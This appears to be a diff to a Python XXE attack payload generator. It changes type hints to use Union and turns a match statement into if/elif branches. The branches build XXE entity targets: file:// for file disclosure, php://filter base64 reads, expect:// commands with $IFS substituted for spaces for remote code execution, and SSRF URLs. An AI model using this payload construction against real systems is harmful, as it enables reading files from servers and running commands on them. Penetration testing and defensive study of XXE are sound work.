@@ -1,6 +1,6 @@
 from abc import ABC
 from abc import abstractmethod
-from typing import List
+from typing import List, Union
 from typing import Optional
 from typing import Sequence
 
@@ -51,7 +51,7 @@ class AbstractPayloadGenerator(ABC):
             )
         ]
 
-    def _get_payload_remote_entities(self) -> List[XMLEntity | str]:
+    def _get_payload_remote_entities(self) -> List[Union[XMLEntity, str]]:
         if self._http_server_params is None:
             return []
 
@@ -63,7 +63,7 @@ class AbstractPayloadGenerator(ABC):
 
     def _get_base_payload_entities(
         self,
-    ) -> Sequence[XMLEntity | str]:
+    ) -> Sequence[Union[XMLEntity, str]]:
         if self._should_use_cdata:
             entities = [
                 XMLEntity(
@@ -92,15 +92,14 @@ class AbstractPayloadGenerator(ABC):
         if self._should_apply_base64_encoding:
             return f"php://filter/convert.base64-encode/resource={self._resource}"
 
-        match self._attack_type:
-            case XXEAttackType.FILE_DISCLOSURE | XXEAttackType.DIRECTORY_LISTING:
-                return f"file://{self._resource}"
-            case XXEAttackType.RCE:
-                return f"expect://{'$IFS'.join(self._resource.split(' '))}"
-            case XXEAttackType.SSRF:
-                return self._resource
+        if self._attack_type in (XXEAttackType.FILE_DISCLOSURE, XXEAttackType.DIRECTORY_LISTING):
+            return f"file://{self._resource}"
+        elif self._attack_type == XXEAttackType.RCE:
+            return f"expect://{'$IFS'.join(self._resource.split(' '))}"
+        elif self._attack_type == XXEAttackType.SSRF:
+            return self._resource
 
-    def _get_payload_entities(self) -> Sequence[XMLEntity | str]:
+    def _get_payload_entities(self) -> Sequence[Union[XMLEntity,str]]:
         return self._get_base_payload_entities()
 
     def _modify_xml_content(self):
